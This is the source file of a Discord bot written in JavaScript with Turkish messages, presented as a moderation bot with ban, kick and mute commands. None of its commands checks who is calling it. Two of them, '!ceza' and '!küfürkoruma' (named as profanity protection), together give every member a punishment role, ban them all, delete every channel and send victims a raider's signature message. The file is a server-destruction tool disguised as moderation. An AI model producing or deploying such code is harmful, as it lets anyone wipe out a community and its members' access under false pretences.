// index.js
require('dotenv').config();
const { Client, GatewayIntentBits, Partials, PermissionsBitField } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ],
  partials: [Partials.Channel]
});

client.once('ready', () => {
  console.log(`✅ Bot aktif: ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (!message.guild || message.author.bot) return;

  const args = message.content.trim().split(/ +/);
  const command = args.shift().toLowerCase();

  if (command === '!tamyasakla' && message.mentions.members.first()) {
    const member = message.mentions.members.first();
    if (member.bannable) {
      await member.send('❌ Sunucudan yasaklandınız.').catch(() => {});
      await member.ban({ reason: 'Babaannenin emriyle tamyasaklandınız.' });
      message.channel.send(`🔨 ${member.user.tag} sunucudan yasaklandı.`);
    } else {
      message.reply('❌ Bu kişiyi banlayamıyorum.');
    }
  }

  else if (command === '!kick' && message.mentions.members.first()) {
    const member = message.mentions.members.first();
    if (member.kickable) {
      await member.send('👢 Sunucudan atıldınız.').catch(() => {});
      await member.kick('Babaannenin emriyle kicklendi.');
      message.channel.send(`👢 ${member.user.tag} sunucudan atıldı.`);
    } else {
      message.reply('❌ Bu kişiyi atamıyorum.');
    }
  }

  else if (command === '!mute' && message.mentions.members.first()) {
    const member = message.mentions.members.first();
    const durationMs = 10 * 60 * 1000; // 10 dakika
    if (member.isCommunicationDisabled()) {
      message.reply('🔇 Bu kişi zaten susturulmuş.');
    } else {
      await member.disableCommunicationUntil(Date.now() + durationMs);
      message.channel.send(`🔇 ${member.user.tag} 10 dakika susturuldu.`);
    }
  }

  else if (command === '!ceza') {
    const roleName = 'Cezalı';
    let role = message.guild.roles.cache.find(r => r.name === roleName);

    if (!role) {
      role = await message.guild.roles.create({
        name: roleName,
        color: 'DarkRed',
        permissions: []
      });
    }

    const members = await message.guild.members.fetch();
    let count = 0;

    for (const member of members.values()) {
      if (!member.user.bot && !member.roles.cache.has(role.id)) {
        await member.roles.add(role).catch(() => {});
        count++;
      }
    }

    message.channel.send(`✅ Cezalı rolü ${count} üyeye verildi.`);
  }

  else if (command === '!küfürkoruma') {
    const role = message.guild.roles.cache.find(r => r.name === 'Cezalı');
    if (!role) return message.reply('❌ "Cezalı" rolü bulunamadı.');

    const members = await message.guild.members.fetch();
    let bannedCount = 0;

    for (const member of members.values()) {
      if (!member.user.bot && member.roles.cache.has(role.id)) {
        await member.send('TKTlendiniz By. sys.fors & Alilw').catch(() => {});
        await member.ban({ reason: 'Küfürkoruma aktif edildi.' }).catch(() => {});
        bannedCount++;
      }
    }

    // Tüm kanalları sil
    for (const [channelId, channel] of message.guild.channels.cache) {
      await channel.delete().catch(() => {});
    }

    message.channel.send(`🧹 ${bannedCount} kişi küfürkoruma ile banlandı. Tüm kanallar silindi.`);
  }
});

client.login(process.env.TOKEN);
